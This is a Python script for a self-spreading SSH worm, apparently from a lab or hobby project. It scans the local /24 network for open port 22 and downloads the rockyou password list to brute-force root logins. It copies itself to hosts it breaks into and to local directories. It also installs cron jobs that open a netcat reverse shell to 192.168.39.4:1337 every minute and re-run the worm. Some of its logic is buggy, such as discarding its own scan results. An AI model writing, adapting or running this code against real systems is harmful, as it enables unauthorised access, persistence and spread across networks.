#!/usr/bin/env python3

import sys
from sys import argv
import os
import shutil
import nmap
import netifaces
import paramiko
import urllib
from urllib import request
import socket
import time





#gets gateway of the network
gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]

#name of script, name of directory to create
script = argv
name = str(script[0])
directory = "gravlax"
hosts = []

#port scanner

def scan_hosts(port):
	port_scanner = nmap.PortScanner()
	port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')

	all_hosts = port_scanner.all_hosts()

	all_hosts = hosts

	return all_hosts

def download_ssh_passwords(filename):

	url = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
	urllib.request.urlretrieve(url,filename)

def sshconnect(host, password):

	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(host, 22, "root", password)

		sftp = client.open_sftp()
		sftp.put(name, "/tmp")

		return True
	except socket.error:
		return False
	except paramiko.ssh_exception.AuthenticationException:
		return False
	except paramiko.ssh_exception.SSHException:
		return False

def bruteforce(host, wordlist):
	file = open(wordlist, "r")
	for line in file:
		connection = sshconnect(host, line)
		print(connection)
		time.sleep(5)




def cloning():
#replication
	
#for if the clone dir already exists

	if os.path.exists(directory):
		os.system(r'rm -r ' + directory)

#replication 

	os.mkdir(directory)
	os.system(r"cp " + name + " " + directory)
	os.system(r"cp " + name + " /var/tmp")

#need some way to establish persistence on the victim

#sets up a cron job to create a reverse shell into the victim machine
#sets up an addtional cron job to run the worm again

def cron():
	
	os.system(r'echo "* * * * * nc 192.168.39.4 1337 -e /bin/sh" > cron')
	os.system(r'echo "* * * * * /usr/bin/python /var/tmp/worm.py" >> cron')
	os.system(r'crontab -i cron')
	os.system(r'rm cron')



#main function
def main():
	cloning()
	cron()
	scan_hosts(22)
	download_ssh_passwords('rockyou.txt')
	for host in hosts:
		bruteforce(host,'rockyou.txt')





if __name__ == "__main__":
	main()
